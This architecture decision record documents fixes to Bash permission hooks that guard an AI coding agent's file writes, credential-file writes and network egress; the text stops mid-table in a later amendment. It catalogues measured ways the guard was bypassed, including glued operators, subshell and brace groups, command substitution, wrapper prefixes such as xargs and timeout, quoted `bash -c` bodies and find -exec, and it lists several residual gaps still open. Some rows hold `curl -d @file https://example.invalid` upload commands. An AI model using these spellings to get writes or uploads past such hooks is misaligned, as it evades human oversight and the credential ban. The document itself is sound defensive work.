# ADR: one authored control-operator splitter for both Bash gates, and why `&` is not always an operator

Status: accepted (plan `dfacff61-23d5-474e-846c-2e2f0f0ea482`, 2026-09-03)

## Context

Both hooks that read Bash text tokenize it with `shlex.split(cmd, comments=False,
posix=False)`. `posix=False` forces `whitespace_split=True`, so punctuation is not a
delimiter: an unquoted run of non-whitespace is ONE token whatever it carries. Two
measured tokenizations:

    shlex.split('foo > src/log.txt; bar', posix=False)  -> ['foo', '>', 'src/log.txt;', 'bar']
    shlex.split('foo 2>/dev/null; bar', posix=False)    -> ['foo', '2>/dev/null;', 'bar']

A control operator written with no space in front of it therefore stays glued to the token
before it, with three consequences.

**1. Every extracted VALUE was corrupted.** Each consumer takes the raw token text:
`redir_target` (`hooks/scripts/writ-bash-write-gate.sh:1085-1086`, `if rest: return
rest`), `tee` arguments (`:1340`), `dd of=` (`:1342`), `cp`/`mv`/`install` destination and
`-t DIR` (`:1357`, `:1361`), `sed -i` (`:1366`), and the egress positionals via
`strip_redirs` (`:914`). All line numbers are pre-change.

**2. The credential guard was DEFEATED, and it returned ALLOW with no signal.**
`writ.session.gates._is_credential_path` is basename-driven, and `.env;`, `.env&&`,
`.env|`, `id_rsa;` and `key.pem;` are not credential basenames. Measured end to end
through the real hook, in work mode with BOTH work gates approved: `echo x > .env ; ls`
denies with `[SEC-CREDENTIAL-WRITE]`, while `echo x > .env; ls` and `echo x > .env&& ls`
were allowed silently. Bash writes `.env` in every one of those spellings, so the gate
judged a path the OS never touches. That is an organization-level boundary ("never read or
write credential files") turned off by one missing space.

**3. The command AFTER the operator was invisible.** Because the operator never became a
token, `CONTROL` (`:628`) never matched, the segmentation loop never split, and the
following command stayed a trailing argument of the previous segment. `verb_at`
(`:770-837`) inspects `seg[0]` only, so it could never see it: a glued separator in front
of `curl -d @file https://host` lost the egress row entirely. The same mechanism sits in
`hooks/scripts/writ-worktree-safety.sh`, where it hid a real `git worktree add`.

The corrupted values and the lost segmentation are the SAME defect seen from two ends.
Patching the six consumers to strip trailing punctuation would have fixed the values while
leaving the invisible-command half wide open.

**The category was disclosed while this instance was not.** `writ-bash-write-gate.sh:41-45`
named "glued `foo>bar`" in its COVERAGE LIMIT, and `:89-93` named "glued forms the
tokenizer does not split", so a reader of either passage would have concluded that gluing
was a known accepted limit rather than a live credential-guard bypass. Both passages are
CORRECTED by this cycle rather than left standing: the write block now states the
mechanism, the measured allow-to-deny flip, and exactly what remains in that family, and
the egress clause now points at the write block and says that this member is fixed.

## Decision

One authored source, `writ/session/bash_tokens.py`, exporting

    split_control_operators(tokens: list[str]) -> list[str]

which re-splits each token so every control operator (`;`, `&&`, `&`, `|`, `||`) is its
own token. Pure, total, no I/O, raises for no input, idempotent, and it imports nothing at
all so it loads under `python -S` and is safe to paste inline.

It is called EXACTLY ONCE per hook invocation, on the full token list, between
`shlex.split` and the segmentation loop. Nothing downstream changes: the redirect loop,
the `cmd0` write arms, the inline-interpreter scan and the egress pass all see the same
corrected stream.

Both hooks IMPORT it, and both carry its marker-delimited block inline as a mirror. This
follows the precedent in the very file being fixed: `_is_credential_path` is imported from
`writ.session.gates` with "SINGLE SOURCE, no drift" plus a minimal inline fallback used
only if the package import fails (`writ-bash-write-gate.sh:563-592`).

Reachability was VERIFIED rather than assumed, and the answer for the worktree hook was
"not as written". It invoked its embedded python as `WRIT_WT_CMD="$CMD" python3 <<'PY'`,
passing no `WRIT_DIR` and doing no `sys.path` manipulation, so the package was unreachable
from there. It becomes reachable with exactly the two lines the write gate already has:
`WRIT_DIR="$WRIT_DIR"` on the invocation and `sys.path.insert(0, os.environ.get("WRIT_DIR",
""))` inside. `WRIT_DIR` is computed identically in both hooks, so this is a two-line
change to an already-proven pattern.

**The mirror is PROVED, not trusted, and the measurement is why that matters.** The hooks
run `python3`, the SYSTEM interpreter, which has no install of this package, so under the
real hook the import succeeds only through the `sys.path` insert. The test suite runs
under `.venv/bin/python`, which carries an EDITABLE install
(`.venv/lib/python3.12/site-packages/__editable___claude_writ_1_5_0_finder.py`, whose
`MAPPING` points `writ` at this repo), so `import writ` succeeds there regardless of
`WRIT_DIR` and the suite ALWAYS exercises the package copy. A hand-written fallback would
therefore never be executed by any test. So:

- each copy sits between `# MIRROR BEGIN split_control_operators` and
  `# MIRROR END split_control_operators`, at top level, with the module's indentation;
- the import that FOLLOWS the mirror rebinds the name, so the package copy is
  authoritative whenever it resolves;
- `tests/test_bash_control_operator_split.py` asserts the three blocks are textually
  identical AND `exec`s each hook's block and compares its token stream against the
  package function on every matrix and trap input;
- a POSITIVE reachability signal exists (`TestThePackageCopyIsTheOneThatRuns`) because the
  mirror makes a failed import behave identically, so no verdict can tell you whether the
  import resolved. The probe runs `python -S -E` with `cwd` outside the repo, asserts the
  import succeeds with `WRIT_DIR` set and FAILS with it empty.

### The trap: `&` is not always a control operator

A bare `&` backgrounds, but `&` also appears INSIDE a redirect as a file-descriptor
duplicate (`2>&1`, `>&2`, `<&3`), and `&>` is itself a redirect operator. Splitting `&`
unconditionally would break `2>&1` into pieces and change how every redirect is read.
Measured before the fix: `foo >/dev/null 2>&1; bar` yields NO target, because
`redir_target` sees `rest` starting with `&` and returns None for the fd-dup, which
happens to swallow the trailing `;` harmlessly. The fix must keep that at NO target while
still splitting the `;`, so the splitter tracks whether the character it is looking at
follows a redirect operator within the same token:

- `>`, `>>`, `>|` and a run of `<` set an "after a redirect operator" flag;
- an `&` while that flag is set is kept in the token, so `2>&1` stays one token;
- an `&` immediately followed by `>` is the `&>` redirect operator, so it opens a NEW
  token rather than becoming an operator token, which is how bash lexes it;
- otherwise `&&` is matched before `&`, and `||` before `|`.

A fix that segments correctly and invents a `&1` target has traded one defect for another,
so both halves are pinned in both spellings: `2>&1` produces no target glued or spaced,
AND the write target of the command after the glued separator IS produced.

Quoted spans are never split. That is what preserves `> "src/log.txt";` (correct today,
because shlex ends a token at a closing quote even with no following whitespace) and what
keeps `sed -i -e 's/a/b/;s/c/d/' f` a single argument. A backslash escapes the next
character for the same reason.

`>` is deliberately NOT a boundary. `foo>src/x.py`, an operator glued to the verb IN FRONT
of it, is a different mechanism with no token boundary to recover, and it stays disclosed
rather than half-fixed. The one member of that family that becomes visible is the `&>`
spelling (`foo&>src/x.py`), because an `&` in that position can only start a redirect.

### Where the module lives

`writ/session/bash_tokens.py`, beside `gates.py`, the other hook-shared classifier, so one
`sys.path` insert serves both imports; `writ/session/__init__.py` is a docstring only, so
the import costs no package initialization on the hook hot path.

## Alternatives considered

1. **Two hand-authored inline copies, one per hook.** Rejected: that is the door
   divergence the last two cycles were about, and one fixed copy with one broken copy is
   the exact failure mode. The mirror keeps the hooks self-sufficient without making them
   independent authors, and the identity plus equivalence tests make drift impossible to
   ship silently.
2. **Package import with NO fallback.** Rejected in both directions. Failing OPEN on a
   failed import silently restores the defect, which is the thing being fixed; failing
   CLOSED makes the hook refuse every redirect in the repo on an infrastructure fault, and
   a refusal with no named action is a deadlock this repo has already shipped once.
3. **Splitting `&` unconditionally.** Rejected on the measured `2>&1` behavior above: it
   would break every fd-dup redirect and could invent a `&1` write target.
4. **Making `>` a boundary too.** Rejected as a separate mechanism whose blast radius is
   not justified by this cycle's evidence: it would cut inside `[[ ]]`/`[ ]`/`(( ))`
   comparison and arithmetic spans and inside every unquoted argument that merely contains
   `>`. `foo>bar` stays disclosed in both hook headers.
5. **`writ/shared/` as the module's home.** Rejected because `writ/shared/tokens.py`
   already means LLM token accounting, and a `bash_tokens.py` beside it invites the wrong
   reading.

## Consequences

**Newly gated for ordinary writes, and AT THE TIME STILL A MISS FOR SECRETS.** Splitting inside a
token also splits the body of an unquoted command substitution or a paren group: `(cd x; cp
a src/y.py)` tokenizes as `['(cd', 'x;', 'cp', 'a', 'src/y.py)']` and now segments, so the
`cp` destination is extracted as `src/y.py)` with a stray paren, where before the fix it
produced no target, no gate call and no audit row. For an ordinary path that reads as a net
gain with a cosmetically wrong character, and the cycle O amendment below records the
measurement that refutes the word "cosmetically": a stray `)` also defeats the NONFILE
exact-string set, so `(echo x > /dev/null)` emitted `('outside', '/dev/null)')` and every
`(cmd > /dev/null)` was work-gated.

CALLING IT COSMETIC WAS FALSE FOR A CREDENTIAL PATH, and the measurement said so. Group
constructs defeated the credential guard by TWO separate mechanisms, both present before
this cycle and both still present after it (verified by reverting). BOTH ARE CLOSED by the
cycle O amendment below; the measurements are kept because they are the evidence that
amendment rests on:

- The VERB carries the group character, so no arm matches and there is NO ROW AT ALL.
  Measured through the extractor: `(cp seed.txt src/y.py)` and `( cp seed.txt src/y.py)`
  and `{ cp seed.txt src/y.py; }` each yield the empty set, because `seg[0]` is `(cp`, `(`
  or `{` and `verb_at` resolves none of them to `cp`.
- The REDIRECT path does not consult the verb, so a redirect inside a group IS seen, but
  its target keeps the trailing `)` and the basename-driven classifier misses it the same
  way it missed `.env;`. Same class as the defect this cycle fixed, spelled with `)`
  instead of `;`.

End to end through the real hook, work mode, BOTH gates approved: `cp seed.txt <secret>`
denies with `[SEC-CREDENTIAL-WRITE]`, while `(cp seed.txt <secret>)` and
`(echo x > <secret>)` are ALLOWED SILENTLY. So a credential write is still hidden by
wrapping it in a group, and this cycle did not change that either way.

CORRECTED IN THE CYCLE O AMENDMENT BELOW, not here. This cycle deliberately stopped at the
tokenizer: trailing-punctuation stripping per consumer is the patching this design
replaced, and hardening the classifier against malformed input would treat the symptom.
The amendment keeps both of those rejections and closes the hole in the two places the
mechanisms actually live: verb resolution, and one normalization point ahead of
classification.

**Residue that stays open, so the fix is not read as wider than it is.**

- `foo>src/x.py`, the operator glued to the verb in front of it.
- A shell KEYWORD or a GROUP OPENER in verb position. Open when this ADR was written,
  CLOSED by the cycle O amendment below; the residue that remains is enumerated there
  (a substitution inside an assignment, a `case` branch's first command, and a function
  definition body).
- The NEWLINE separator in the write gate. MEASURED this cycle rather than read: through
  the hook's own embedded extractor, `WRIT_BASH_CMD="ls\ncp seed.txt src/x.py"` with
  `WRIT_CWD=/proj` emits NO row, while the `;`-separated control `"ls ; cp seed.txt
  src/x.py"` emits `local /proj/src/x.py`. `shlex` discards newlines, so `CONTROL`'s `"\n"`
  member matches nothing and a multi-line command is judged as ONE segment whose verb is
  the first line's. `writ-worktree-safety.sh` pre-splits newlines outside quotes and strips
  heredoc bodies for exactly this reason; the write gate does neither, and porting it needs
  the heredoc stripper too, or a document ABOUT a write becomes a refusal. Deferred to its
  own cycle and disclosed in the header rather than bolted on here.

**In the worktree hook the splitter runs AFTER heredoc-body stripping**, on purpose, so a
body line is never re-split and can never contribute a segment. That ordering is what keeps
`cat <<'EOF' ... git worktree add ... EOF` from becoming a refusal.

**What is NOT proven.** The classifier (`gates._is_credential_path`), the embedded
extractor's rows and the real hook's `permissionDecision` were all measured. A write
LANDING ON DISK through the full Claude Code path was NOT verified. "Bash writes `.env` in
every case" is shell semantics, not an observation of a file appearing on this machine, and
no test in this cycle opens or creates a credential file (organization credential ban).
Nothing here proves any behavior of the tokenizer under a Claude Code envelope shape that
the synthetic envelopes in the test harness do not reproduce.

## Amendment (cycle O): group constructs in verb position

The residue this ADR left open ("a shell KEYWORD in verb position") and the miss it
disclosed but did not fix ("the credential guard is defeated by a paren today") are both
CLOSED here. The tokenizer is untouched: nothing about `split_control_operators`,
segmentation or quoting changed. What changed is which token is called the verb, and what
one loop does to a value before classifying it.

### The two mechanisms, as measured

MEASURED through the write gate's own embedded extractor with `WRIT_CWD=/proj`, before the
fix:

```
cp seed.txt src/y.py                        -> {('local', '/proj/src/y.py')}   (control)
(cp seed.txt src/y.py)                      -> set()
( cp seed.txt src/y.py)                     -> set()
( cp seed.txt src/y.py )                    -> set()
{ cp seed.txt src/y.py; }                   -> set()
$(cp seed.txt src/y.py)                     -> set()
`cp seed.txt src/y.py`                      -> set()
if true; then cp seed.txt src/y.py; fi      -> set()
while true; do cp seed.txt src/y.py; done   -> set()
(echo x > src/y.py)                         -> {('local', '/proj/src/y.py)')}
(echo x > /dev/null)                        -> {('outside', '/dev/null)')}
( echo x | tee src/y.py )                   -> {('local', '/proj/src/y.py'),
                                                ('local', '/proj/)')}
```

1. NO ROW AT ALL. `verb_at` stepped over a prefix only by membership in `WRAPPERS`, so a
   group character occupying verb position (`(`, `{`) or glued to it (`(cp`, `$(cp`,
   `` `cp ``) became "the verb" and matched none of the `cmd0` write arms. Reserved words
   failed for a second reason: the `;` split isolates `then` and `do` ALONE in `seg[0]`,
   and neither is in `WRAPPERS`.
2. A CORRUPTED VALUE, COSTING IN BOTH DIRECTIONS. The redirect path never consults the
   verb, so a redirect inside a group WAS seen, with the group's trailing closer still on
   its target. `src/y.py)` defeats the basename-driven credential classifier exactly as
   `.env;` did, and `/dev/null)` defeats the `NONFILE` exact-string set, which made every
   ordinary `(cmd > /dev/null)` work-gated. The missed secret and the refused chore are the
   same corrupted value read by two different arms.

End to end through the real hook, work mode, BOTH gates approved: `cp seed.txt <secret>`
denied with `[SEC-CREDENTIAL-WRITE]` while `(cp seed.txt <secret>)` and
`(echo x > <secret>)` were ALLOWED SILENTLY.

### Decision

`writ/session/bash_tokens.py` gains `GROUP_VERB_TOKENS`, `GROUP_OPENER_PREFIXES`,
`ARITH_OPENERS`, `GROUP_CLOSER_TOKENS`, `strip_group_opener` and
`strip_unbalanced_close`, INSIDE the existing `# MIRROR BEGIN/END
split_control_operators` block, so the two hooks share one authored source and the
existing textual-identity test catches drift. The marker strings keep their spelling (they
are what `tests/test_bash_control_operator_split.py` slices on); a comment inside the block
records that the name is now historical and the block carries every shared bash-token
helper.

- Both hooks' `verb_at` loops step over a token that is in `GROUP_VERB_TOKENS` after
  `strip_group_opener` has removed a glued opener. The two `verb_at` BODIES stay separate,
  because the write gate parses sudo/doas short-option grammar strictly while the worktree
  hook only answers "is the verb git"; the shared thing is the stepping vocabulary, not the
  function.
- The write gate applies `strip_unbalanced_close` at ONE place, the head of the
  classification loop, which is downstream of every collection vector (the redirect loop,
  the six `cmd0` arms, the inline-interpreter pass) and upstream of every judgement
  (`NONFILE`, the credential classifier, the gate-state realpath, the `seen` dedup, the
  abspath and the local/outside split). The worktree hook applies it at the ONE place a
  `target` is assigned.
- A closer standing ALONE on its own token is dropped where SEGMENTS are built, in both
  hooks, and it is not a normalization case at all. See "The bare closer" below.

### The stepping set, member by member

IN: `(` and `{` (group openers, a command list follows directly); `then`, `do`, `else`
(reserved words a command list follows directly); `if`, `elif`, `while`, `until` (what
follows is a CONDITION, which is itself a command list that really runs, as in `if cp seed.txt
.env; then :; fi` executes the `cp`); `!` (pipeline negation).

OUT, each for a stated reason:

- `[`, `[[`, `test`: LOAD-BEARING exclusion. These ARE the verb, and the write gate
  suppresses redirects for a segment whose verb is one of them (`seg_is_test`). Stepping
  over `[[` would make `"$x"` the verb, un-suppress the span, and read
  `if [[ "$x" > "config.txt" ]]; then echo hi; fi` as a write to `config.txt`.
- `((`, `$((`: arithmetic, not a group. The extractor counts the LITERAL substrings `((`
  and `))` as a depth counter, which owns that spelling, so `strip_group_opener` returns
  such a token unchanged.
- `for`, `select`, `case`, `in`: what follows is a VARIABLE NAME or a WORD, not a command,
  so stepping would resolve a WRONG verb rather than recover a hidden one. A loop BODY is
  still covered, because `do` is in the set.
- `fi`, `done`, `esac`, `}`, `)`: closers; nothing follows them inside their segment.
- `coproc`, `function`: both take an OPTIONAL NAME before the command, and an optional
  name is not distinguishable from the command itself, so stepping over it resolves a
  WRONG verb as often as it recovers a hidden one. This reason stands on its own. It was
  originally given by analogy ("the same reason `timeout`, `stdbuf`, `nice`, `setsid`,
  `xargs` and `watch` are absent from `WRAPPERS`"), and that analogy is dead: the cycle P
  amendment below made all six `WRAPPERS` entries. The distinction that survives is
  SHAPE. `timeout`'s one positional is a DURATION, which has a checkable shape, so it can
  be stepped conditionally; an optional name has no shape at all.

### Three glued prefixes, and why the two substitution syntaxes are one case

`GROUP_OPENER_PREFIXES = ("$(", "(", "`")`. All three were MEASURED silent (see the table
above), which is the evidence that made them one case rather than a subshell fix plus a
guess. The backtick is the older command-substitution spelling; bash runs the substitution
and the `cp` inside it executes either way, so resolving the substitution's first word as
the verb is correct semantics, and it can only ADD rows when that word is one of the write
arms. Leaving it out would have been a one-character bypass of this fix.

`{` is deliberately NOT in the tuple, and the reason is EXECUTED rather than read:
`bash -c '{echo hi; }'` is a syntax error (`syntax error near unexpected token `}'`) while
`bash -c '{ echo hi; }'` prints `hi`. A glued `{` does not merely fail to open a group, it
does not parse at all, so the spelling cannot be a bypass vector and stripping it would
invent a verb for a command bash refuses to run. The bare `{` is in `GROUP_VERB_TOKENS`
instead.

RETRACTED, because the first pass at this decision got it wrong and the reason should not
survive in the record: the backtick was initially left out on the argument that "unbalanced
trailing" is undefined for a character that is its own closer. Parity expresses it fine, so
the argument was wrong rather than merely cautious.

### Two counting rules, never `rstrip`

`strip_unbalanced_close` is COUNTED, with one rule per closing character:

- `)` comes off only while the token holds MORE `)` than `(`, which is what a group closer
  looks like from inside the token that ended the group. `src/note(1))` therefore becomes
  `src/note(1)`, where `rstrip(")")` would have produced `src/note(1`.
- a BACKTICK is its own closer, so "more closers than openers" is undefined for it and the
  rule is PARITY: a trailing backtick comes off only while the token's backtick count is
  ODD. `` src/y.py` `` becomes `src/y.py`, and `` src/a`b`.txt `` is untouched.

It never returns the empty string: a one-character token is left alone, because `""` is a
`NONFILE` member and turning a target into a `NONFILE` member would DELETE a row that
exists today rather than correct it.

`}` needs no rule: bash requires a `;` or `&` before a brace group's `}`, and the splitter
already makes that boundary, so `{ cp seed.txt src/y.py; }` yields a clean token.

### The bare closer, which is SYNTAX and not a value

A fully spaced subshell puts the closer on its OWN token, and a bare `)` is a valid
positional argument to every write arm: the `cp`/`mv`/`install` destination is `cand[-1]`
and the `sed -i` file is `files[-1]`, both filtered only on "not a flag and not a
redirect", and the `tee` loop takes any non-flag argument. So `( cp seed.txt src/y.py )`
would have resolved the DESTINATION to `)`, which is a phantom target AND a lost real one:
the fix would have traded the blind spot for a worse defect. The same shape was already
live before this cycle on the arm that needs no verb, measured: `( echo x | tee src/y.py )`
emitted the phantom row `('local', '/proj/)')` beside the real target.

`strip_unbalanced_close` cannot answer it, structurally: the bare token IS the closer, so
stripping would yield `""`, which the "never empty" rule forbids for a reason. The token is
therefore dropped where SEGMENTS are built, in both hooks, as one more thing that is not a
command word, in the same place and the same shape as the existing `CONTROL` check, one line
beside it. `GROUP_CLOSER_TOKENS` holds `)` only: `]`, `]]` and `))` are COUNTED by the
comparison and arithmetic suppression, so dropping them would un-suppress those spans, and
a lone `}` never shares a segment with a write.

### Alternatives rejected

1. **Making `(` or `)` a token boundary in `split_control_operators`.** The obvious fix and
   the one the next reader will reach for. It would break three things that work today:
   the arithmetic depth counter (it counts the LITERAL `((` and `))` inside ONE token, so
   it REQUIRES them glued); the process-substitution guard `if rest.startswith("("):
   return None` inside `redir_target` (splitting `>(cmd)` would make the `>` look like it
   targets a bare `(`); and `$(...)`, which would be blown open into unrelated top-level
   segments. This amendment touches neither the splitter's behavior nor segmentation.
2. **Per-consumer trailing-punctuation stripping.** Rejected again, for the same reason
   this ADR rejected it: it is the patching the single re-split replaced, and it would put
   the same rule in nine places that already agree on one list.
3. **A second shared module beside `bash_tokens.py`.** Rejected: the mirror block already
   exists, is already asserted byte-identical across three files, and a second sharing
   mechanism would need its own drift test.
4. **Normalizing egress hosts.** Rejected: egress destinations have no single collection
   list to normalize at, and the direction of the error is fail-closed, because an
   unmatched allowlist entry can only ADD a confirmation prompt, never remove one.
   `(curl -d @f https://example.invalid)` now asks, with the host carrying a cosmetic `)`.

### Accepted cost

A file whose name really ends in an UNBALANCED `)` is gated under the name without it
(`cp a 'src/weird)'` records `src/weird`). The direction is fail-closed: the row still
exists, and a credential named `.env)` normalizes INTO a deny rather than out of one. A
test pins it so it is documented behavior rather than a surprise.

The BOUNDARY direction is safe for a structural reason worth stating, because it is the
other half of the verdict: normalization can only SHORTEN a path, and a shorter path cannot
become contained in a root that did not contain the longer one, so a target outside the
project cannot normalize its way inside. Measured across the cases the test pins:
`/etc/foo)` normalizes to `/etc/foo` and stays out of project; `.env)` becomes a credential
where it was not one; a balanced `src/note(1)` is untouched; and a lone `)` returns itself
rather than the empty string, which would have deleted the row instead of correcting it.

One live behavior LOOSENS, and it is the correct one: `(echo x > /dev/null)` goes from the
row `outside /dev/null)` to NO row. That row only ever existed by corruption; the
uncorrected `/dev/null` is a `NONFILE` member and has never produced one.

### Residue that stays open

- A substitution inside an ASSIGNMENT: `out=$(cp a src/y.py)` matches `ASSIGNMENT` on
  `out=$(cp`, so `verb_at` steps the whole token and resolves `a` as the verb.
- The FIRST command of a `case` branch: `case $x in a) cp a src/y.py;; esac` leaves `a)` in
  verb position, and stepping over it needs pattern-list parsing.
- A FUNCTION DEFINITION body: `f() { cp a src/x.py; }` resolves its verb to `f()`. Out of
  scope rather than missed, because the body writes only when the function is CALLED, and
  the call resolves to the verb `f`, which is the already-disclosed wrapper-script limit.
- `foo>src/x.py` and the NEWLINE separator in the write gate, both unchanged and both still
  disclosed in that hook's header.

### Measured versus inferred

MEASURED: every extractor row in the table above and its after-state counterpart; the real
write-gate hook's `permissionDecision` in work mode with both gates approved, for the
ungrouped control and for each group spelling; the real worktree hook's decision for the
three grouped `git worktree add` forms and for a gitignored target inside a group; the
egress row for a transfer verb inside a subshell; and the four bash grammar probes,
including the `{echo hi; }` syntax error.

NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Code path.
"Bash writes the file in every one of these spellings" is shell semantics, not an
observation of a file appearing on this machine. No test in this cycle creates, opens or
reads a credential file; the classifier is path-only (organization credential ban).

## Amendment (cycle P): six wrapper prefixes, and one reason that was false

Same seam, fourth instance, and the same single function. `verb_at` stepped over a command
prefix only by membership in `WRAPPERS`, so `xargs`, `timeout`, `nice`, `stdbuf`, `watch`
and `setsid` became `cmd0` themselves and the real command was never resolved. Because
`verb_at` is the single source for the write pass, the egress pass and the interpreter
pass, each prefix hid a write AND a data transfer.

### Measured before the fix

Through the write gate's own embedded extractor with `WRIT_CWD=/proj`:

```
ls | xargs cp -t src                  -> set()
ls | xargs -I{} cp {} src/y.py        -> set()
timeout 5 cp seed.txt src/y.py        -> set()
nice -n 5 cp seed.txt src/y.py        -> set()
stdbuf -oL cp seed.txt src/y.py       -> set()
watch -n1 cp seed.txt src/y.py        -> set()
setsid cp seed.txt src/y.py           -> set()

ls | xargs curl -d @src/a.txt https://example.invalid  -> set()
timeout 5 curl -d @src/a.txt https://example.invalid   -> set()
setsid curl -d @src/a.txt https://example.invalid      -> set()

sudo cp seed.txt src/y.py             -> local /proj/src/y.py   (control)
env FOO=1 cp seed.txt src/y.py        -> local /proj/src/y.py   (control)
```

The obstacle the header had recorded ("each takes non-flag positional arguments of its own
before the command and a naive skip would mis-read the verb") was true of exactly ONE of
the six.

### Decision: STRICT tables, not PERMISSIVE skipping

All six entries carry BOTH a value-flag set and a no-value-flag set. `WRAPPERS` already
supported that arm for `sudo` and `doas`, and `verb_at` already parsed bundled shorts, a
value glued to its letter, the `--flag=value` long form, the spaced form, and `--` as end
of options.

Alternative rejected: PERMISSIVE (`None` second element, as `command` / `env` / `exec` /
`nohup` / `time` use). It skips any dash token, which handles a glued value by accident,
but it reads a SPACED value of an UNKNOWN flag as the verb. STRICT bails to
`("", len(seg), [])` instead. The trade is identical in all six entries: a mis-classified
or unknown flag costs a MISS, never a prompt naming the wrong command. Fail-closed for the
verb, fail-open for detection. A bailed segment's plain redirects are still extracted,
because the redirect loop never consults the verb.

Per-entry decisions and what each trades:

- `setsid`: no value-taking flag at all, so nothing can be mis-placed.
- `stdbuf`: all three real flags take a value, and the measured `-oL` resolves through the
  existing glued-short branch, so no new parsing shape appears.
- `nice`: `-n` takes a value; bare `nice cp` needs no positional step, because the flag
  loop breaks on the first non-dash token. ACCEPTED MISS: the obsolete `nice -5 cmd`
  spelling is an unknown option letter and bails. Handling it would mean treating a
  numeric option letter as an adjustment, a second parsing shape for one deprecated
  spelling.
- `watch`: `-n/--interval` and `-q/--equexit` take values.
  `--differences[=permanent]` is listed NOVALUE on purpose, because an optional long value
  must be glued with `=` and the long branch checks the no-value set first.
- `xargs`: several value-taking flags including the measured glued `-I{}`, `-n1` and `-P4`.
  ACCEPTED MISS: GNU's optional-argument shorts (`-e`, `-i`, `-l`) are listed NOVALUE, so
  the common `xargs -i cp {} src/y.py` resolves `cp` while the glued `xargs -iX cp ...`
  hits an unknown letter and bails.
- `timeout`: `-s` and `-k` take values, plus the one genuine positional below.

### The positional, and why it is a side table

`timeout DURATION COMMAND` is the only positional among the thirteen wrappers. Rather than
widen the `WRAPPERS` tuple to a third element and touch twelve untouched entries, it is a
one-line side table plus a shape check:

```python
WRAPPER_POSITIONALS = {"timeout": 1}
DURATION = re.compile(r"^[0-9]+(?:\.[0-9]+)?[smhd]?$")
```

stepped immediately after the wrapper's flag loop. Placement there is what makes every
spelling work: the loop exits by `break` on the first non-dash token (`timeout 5 cp`), or
on `--` (`timeout -- 5 cp`), or after consuming a value (`timeout -s KILL 5 cp`,
`timeout -k 1 5 cp`), and the step runs in all four cases. A bail inside the flag loop
returns from `verb_at` outright, so the step is never reached with an unclassified option,
and `.get(name, 0)` is 0 for the other twelve wrappers, so no existing prefix changes
behavior by one token.

The step is SHAPE-CHECKED, not blind, and that is load-bearing. A token that does not look
like a duration is NOT skipped and becomes the verb, so `timeout cp seed.txt src/y.py`
still resolves `cp`. The only command that lands in the unchecked branch is one `timeout`
itself rejects, so the cost of the check is at worst an extra row for a command that never
runs, never a lost row for one that does.

### The false reason, which is the amendment's second half

The write gate's inline-interpreter note said `sh -c` and `bash -c` are not covered
because "their body is shell, already parsed by the vectors above". MEASURED, that is
false in every quoted spelling: `bash -c "echo x > src/y.py"`,
`bash -c "cp seed.txt src/y.py"`, `bash -c "echo x | tee src/y.py"`,
`sh -c "echo x > src/y.py"` and `bash -c 'echo x > src/y.py'` all emit the empty set,
because the body is ONE token and a token beginning with a quote character never matches
`REDIR`. Only the unquoted `bash -c echo x > src/y.py` is seen, and it is seen because at
that point the redirect belongs to the OUTER command.

The BEHAVIOR of `sh -c`, `bash -c` and `eval` is deliberately unchanged. The reason on the
record is now the real one: the false-positive cost of gating every `bash -c`. A
disclosure that misstates WHY a hole is open is worse than one that admits it, because it
stops the next reader re-examining it. That is what happened here: the wrong reason
survived long enough to be quoted in three other documents as a bare list item.

### Deferred, each for a stated reason

- `find -exec` / `-execdir`. A DIFFERENT MECHANISM: the nested command sits inside an
  argument list with a terminator (`\;`, `';'` or `+`), not in front of the command, so no
  prefix step can reach it. All four spellings were measured silent, and the four silences
  are pinned as tests so the deferral is visible rather than assumed. (This deferral is
  CLOSED by the cycle Q amendment below, which also records that the family is four flags
  and not two: `-ok` and `-okdir` were silent too and were named nowhere here.)
- DELETION. `rm` and `rm -rf` remain out of scope for this gate by recorded ruling, so
  `find . | xargs rm` STAYS silent after the fix. Pinned, so the prefix closure is not
  read as smuggling deletion into scope.
- The worktree gate's own `WRAPPERS`. Prose corrected, code untouched: its parsing is
  permissive-only by design, it has no positional mechanism, and `timeout 5 git worktree
  remove x` evading it is INFERRED from the code rather than measured. Growing it would be
  a second unmeasured change in a module this cycle had no evidence about.
- Further transparent prefixes with no table yet (`ionice`, `chrt`, `flock`, `unbuffer`,
  `script`, `parallel`, `su -c`, `strace`). Each is a table away, not a mechanism away.

### The residue is machine-readable now

The write gate's header used to name the still-uncovered prefixes in prose, and the test
that ratcheted it matched substrings. After the fix those substrings all still appear in
the file as `WRAPPERS` keys, so the pin would have passed VACUOUSLY rather than gone red.
The header now carries a names-only block between `# UNCOVERED PREFIXES BEGIN` and
`# UNCOVERED PREFIXES END`, with every reason in the prose ABOVE it, and the test derives
both sides: the block must be non-empty, must name `find -exec` and `find -execdir`, and
must be DISJOINT from the hook's own `WRAPPERS` keys. Naming a covered prefix as
uncovered, and closing a prefix without updating the block, now both redden.

### Measured versus inferred

MEASURED: the ten extractor rows above and the two controls; each of the six flag tables
against the installed binary's own `--help` (coreutils 9.4, util-linux 2.39.3, findutils
4.9.0, procps-ng 4.0.4); `xargs --max-lines` taking an OPTIONAL argument, executed rather
than read off `--help`, which prints it as though required; the six quoted `sh -c` /
`bash -c` spellings; all four `find -exec` spellings; and the real write-gate hook's
`permissionDecision` for one prefixed egress command (`timeout 5 curl ...` asks and names
the host).

NOT MEASURED, stated plainly: the real hook's `permissionDecision` for the seven prefixed
write rows and the other two prefixed egress rows, which are proved at the extractor layer
only; and a write LANDING ON DISK through the full Claude Code path, which a PreToolUse
hook test cannot show at all and which is therefore left unclaimed. INFERRED, not
measured: `timeout 5 git worktree remove x` evading the worktree gate by the same
mechanism.

## Amendment (cycle Q): a nested command inside an argument list

Same seam, fifth instance, and this time the prefix mechanism could not reach it at all.
find's exec family carries a whole command as ARGUMENTS, ended by one of find's own
terminator tokens. `verb_at` returns ONE verb per segment and returns at the first
non-`WRAPPERS` name, so `cmd0` for the whole segment was `find`, which matches none of the
four write arms and none of `EGRESS_VERBS`. The nested command produced no target, reached
no gate and left no audit row.

### Measured before the fix

Through the write gate's own embedded extractor with `WRIT_CWD=/proj`:

```
find . -name x -exec cp {} src/y.py \;                              -> set()
find . -name x -exec cp {} src/y.py ';'                             -> set()
find . -name x -exec cp -t src {} +                                 -> set()
find . -name x -execdir cp {} src/y.py \;                           -> set()
find . -name x -ok cp {} src/y.py \;                                -> set()
find . -name x -okdir cp {} src/y.py \;                             -> set()
find . -name x -exec tee src/y.py \;                                -> set()
find . -name x -exec sed -i s/a/b/ src/y.py \;                      -> set()
find . -name x -exec curl -d @src/a.txt https://example.invalid \;  -> set()

find . -name x -print                                    -> set()                (control)
